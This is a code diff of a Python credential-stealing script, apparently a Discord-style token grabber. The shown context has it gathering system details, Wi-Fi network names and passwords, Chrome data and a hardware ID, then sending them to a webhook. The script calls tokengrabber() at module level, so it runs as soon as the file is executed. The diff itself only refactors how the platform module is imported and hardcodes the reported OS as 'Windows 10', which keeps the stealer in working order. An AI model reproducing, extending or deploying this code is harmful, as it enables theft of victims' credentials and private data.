@@ -78,7 +78,7 @@ try:
 	import shutil
 	import requests
 	import sqlite3
-	import platform as plt
+	import platform 
 	from re import findall
 	import getpass
 except ImportError or NameError:
@@ -88,14 +88,13 @@ except ImportError or NameError:
 	install('sqlite3')
 	install('platform')
 	install('getpass')
-	import platform as plt
 
 sysinfo = f"""
-        Operating System: {plt.system()}
-        Computer Name: {plt.node()}
+        Operating System: {platform.system()}
+        Computer Name: {platform.node()}
         Username: {getpass.getuser()}
-        Release Version: {plt.release()}
-        Processor Architecture: {plt.processor()}
+        Release Version: {platform.release()}
+        Processor Architecture: {platform.processor()}
                     """
 hook = Webhook(webhook_url)
 def getheaders(token=None, content_type="application/json"):
@@ -267,7 +266,6 @@ def tokengrabber():
 	working = []
 	checked = []
 	working_ids = []
-	computer_os = plt.platform()
 	getwifinetwork,getwifipassword = getwifi().split('|')
 	chrome_dump = chrome()
 	getchromefile = get_chrome_file()
@@ -319,7 +317,7 @@ def tokengrabber():
 					},
 					{
 						"name": "**Pc Info**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
+						"value": f'OS: Windows 10\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
 						"inline": True
 					},
 					{
@@ -386,4 +384,3 @@ def tokengrabber():
 	except Exception as e:
 		print(e)
 tokengrabber()
-
